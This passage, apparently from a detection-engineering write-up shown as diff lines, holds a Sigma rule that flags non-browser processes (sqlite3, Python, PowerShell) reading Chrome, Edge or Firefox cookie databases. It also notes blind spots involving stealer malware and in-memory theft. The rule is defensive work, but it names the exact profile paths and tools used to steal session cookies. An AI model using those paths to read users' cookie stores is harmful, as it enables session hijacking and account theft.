+id: 0d5e8c23-6b4f-4a79-c1e9-5f2b7d84a361
+status: experimental
+description: Detects processes other than browsers reading SQLite cookie databases from Chrome, Edge, or Firefox profile directories. Used by attackers to steal authenticated session tokens without re-authenticating.
+author: Krishna Gupta
+date: 2026-07-01
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_sqlite_tools:
+        Image|endswith:
+            - '\sqlite3.exe'
+            - '\python.exe'
+            - '\python3.exe'
+    selection_cookie_paths:
+        CommandLine|contains:
+            - 'AppData\Local\Google\Chrome\User Data'
+            - 'AppData\Local\Microsoft\Edge\User Data'
+            - 'AppData\Roaming\Mozilla\Firefox\Profiles'
+            - '\Cookies'
+            - '\Network\Cookies'
+    selection_ps_cookie:
+        Image|endswith:
+            - '\powershell.exe'
+            - '\pwsh.exe'
+    selection_ps_cookie_ofn:
+        OriginalFileName:
+            - 'PowerShell.EXE'
+            - 'pwsh.exe'
+    selection_ps_cookie_cli:
+        CommandLine|contains:
+            - 'Chrome\User Data'
+            - 'Edge\User Data'
+            - 'Firefox\Profiles'
+            - 'Cookies'
+    condition: (selection_sqlite_tools and selection_cookie_paths) or (selection_ps_cookie or selection_ps_cookie_ofn) and selection_ps_cookie_cli
+fields:
+    - Image
+    - CommandLine
+    - User
+falsepositives:
+    - Cookie management or synchronization tools operating on browser data for backup purposes.
+level: high
+tags:
+    - attack.credential_access
+    - attack.t1539
+    - analytic.an2107
+    - detection.det0964
+```
+
+---
+
+### 3. Blind Spots & Tuning (The "Problems")
+
+* Problem 1: In-Memory Cookie Theft
+  * The Issue: Advanced tools read cookie databases directly from process memory (Mimikatz-style) without touching the file on disk.
+  * The Fix: Requires memory forensics or EDR-level process memory scanning.
+* Problem 2: Custom Stealer Binaries
+  * The Issue: Commodity stealers (Vidar, Raccoon, RedLine) are custom binaries that directly read cookie files without invoking sqlite3.exe or Python.
+  * The Fix: Detect the stealer binary via hash/YARA, or monitor for suspicious file reads of Cookies paths using Sysmon Event ID 11 with path filters.
+* Problem 3: Browser Lock Files
+  * The Issue: Chrome locks its Cookies database while running. Stealers often copy the file first — detectable via Sysmon Event ID 11 (FileCreate) of Cookies in a temp directory.
+  * The Fix: Add a companion FileCreate rule for Cookies file creation in %TEMP% or user temp directories.
+
+
